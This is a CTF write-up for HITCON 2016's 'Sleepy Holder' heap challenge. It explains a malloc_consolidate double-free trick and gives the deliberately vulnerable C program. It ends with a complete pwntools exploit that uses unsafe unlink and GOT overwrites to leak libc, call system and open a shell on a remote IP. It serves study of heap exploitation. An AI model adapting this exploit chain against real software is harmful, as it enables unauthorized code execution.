# Sleepy Holder
https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder

Author: meh@Hitcon

## Description
This challenge only removes the "free" of huge secret originally. But I made it "Sleepy" after I found some teams brute forcing the heap base. It is impossible to brute force before ctf ends unless you are pretty lucky.
The differences between the Secret and Sleepy are:

1. Sleep and random malloc to prevent brute force
2. No update and wipe for huge secret
3. Huge secret can be kept only once

Apparently, if you can solve Sleepy, you can solve Secret with the same method.

I released a hint: "malloc consolidate" when the ctf was 9 hours left.

## Exploit

This challenge is about another myth of ptmalloc: "the freed chunks with size 0x20 to 0x80 are always in fastbin."

Again, this is not true in this challenge. :P

Searching for the hint in malloc.c, you may find what I want to hint(from the weird design of huge secret): https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L3397

When there is a large request(largebin size is enough) of malloc, it will do consolidating first in order to prevent fragmentation problem. Every fastbin is moved the unsortbin, consolidates if possible, and finally goes to smallbin.

So I make a chunk in the fastbin(an inused big secret beneath it to avoid consolidating into top chunk), and trigger the malloc consolidate by keeping a huge secret. After the chunk goes into smallbin, it is able to pass the double-free check because the check only compares it with the fasttop(putting chunk into fastbin will not change the inuse bit because the fastbin do not consolidate usually). Then we can free it and malloc it again to modify the prev_size and create a fake chunk for unlink. The remaining is just the same as Secret.

Finding this characteristic out is not so easy without some tools related to heap exploit. Maybe it's time to install some tools like pwngdb(made by angelboy)? :P

The first blood went to !SpamAndHex when the ctf left about only two hours. At that time I was just checking the traffic and found the service pwned. So many congrats and thanks because I was so upset and worrying no one would solve this challenge, it was such a torture. XD

btw, the flag is: hitcon{The Huuuuuuuuuuuge Secret Really MALLOC a difference!}

That is true, isn't it? :)

## source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#define BASE 40

char *s_ptr;
char *f_ptr;
char *q_ptr;
int s_flag;
int f_flag;
int q_flag;

void add()
{
    char buf[4];
    char *ptr;
    unsigned int choice;
    puts("What secret do you want to keep?");
    puts("1. Small secret");
    puts("2. Big secret");
    if(!q_flag)
        puts("3. Keep a huge secret and lock it forever");
    memset(buf, 0 ,sizeof(buf));
    read(0, buf, sizeof(buf));
    choice = atoi(buf);

    switch(choice)
    {
        case 1:
            if(f_flag)
                return;
            f_ptr = calloc(1, BASE);
            f_flag = 1;
            puts("Tell me your secret: ");
            read(0, f_ptr, BASE);
            break;
        case 2:
            if(s_flag)
                return;
            s_ptr = calloc(1, BASE*100);
            s_flag = 1;
            puts("Tell me your secret: ");
            read(0, s_ptr, BASE*100);
            break;
        case 3:
            if(q_flag)
                return;
            q_ptr = calloc(1, BASE*10000);
            q_flag = 1;
            puts("Tell me your secret: ");
            read(0, q_ptr, BASE*10000);
            break;
    }

}

void del()
{
    char buf[4];
    int choice;
    puts("Which Secret do you want to wipe?");
    puts("1. Small secret");
    puts("2. Big secret");
    memset(buf, 0, sizeof(buf));
    read(0, buf, sizeof(buf));
    choice = atoi(buf);

    switch(choice)
    {
        case 1:
            free(f_ptr);
            f_flag = 0;
            break;
        case 2:
            free(s_ptr);
            s_flag = 0;
            break;
    }

}

void update()
{
    char buf[4];
    int choice;
    puts("Which Secret do you want to renew?");
    puts("1. Small secret");
    puts("2. Big secret");
    memset(buf, 0, sizeof(buf));
    read(0, buf, sizeof(buf));
    choice = atoi(buf);

    switch(choice)
    {
        case 1:
            if(f_flag)
            {
                puts("Tell me your secret: ");
                read(0, f_ptr, BASE);
            }
            break;
        case 2:
            if(s_flag)
            {
                puts("Tell me your secret: ");
                read(0, s_ptr, BASE*100);
            }
            break;
    }
    
}

void handler(){
    puts("Timeout!");
    exit(1);
}

void init_prog(){

    setvbuf(stdout, 0,2,0);
    signal(SIGALRM, handler);
    alarm(60);
}


int main()
{
    init_prog();
    puts("Waking Sleepy Holder up ...");
    int fd = open("/dev/urandom", O_RDONLY);
    unsigned int rand_size;
    read(fd, &rand_size, sizeof(rand_size));
    rand_size %= 4096;
    malloc(rand_size);
    sleep(3);
    char buf[4];
    unsigned int choice;
    puts("Hey! Do you have any secret?");
    puts("I can help you to hold your secrets, and no one will be able to see it :)");
    while(1){
        puts("1. Keep secret");
        puts("2. Wipe secret");
        puts("3. Renew secret");

        memset(buf, 0 ,sizeof(buf));
        read(0, buf, sizeof(buf));
        choice = atoi(buf);
        switch(choice){
            case 1:
                add();
                break;
            case 2:
                del();
                break;
            case 3:
                update();
                break;
        }
    }

}
```

## exp
```python
#!/usr/bin/env python
from pwn import *

r = remote('52.68.31.117', 9547)
def add(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('1')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

def de(t):
    r.recvuntil('3. Renew secret\n')
    r.sendline('2')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))

def update(t, s):
    r.recvuntil('3. Renew secret\n')
    r.sendline('3')
    r.recvuntil('Big secret\n')
    r.sendline(str(t))
    r.recvuntil(': \n')
    r.send(s)

add(1, 'a')
add(2, 'a')
de(1)
add(3, 'a')
de(1)

f_ptr = 0x6020d0
fake_chunk = p64(0) + p64(0x21)
fake_chunk += p64(f_ptr - 0x18) + p64(f_ptr-0x10)
fake_chunk += '\x20'
add(1, fake_chunk)
de(2)

atoi_GOT = 0x602080
free_GOT = 0x602018
puts_GOT = 0x602020
puts_plt = 0x400760
atoi_offset = 0x36e70
system_offset = 0x45380

f = p64(0)
f += p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT)
f += p32(1)*3
update(1, f)
update(1, p64(puts_plt))
de(2)
s = r.recv(6)
libc_base = u64(s.ljust(8, '\x00')) - atoi_offset
system = libc_base + system_offset
update(1, p64(system))
add(2, 'sh\0')
de(2)


r.interactive()

```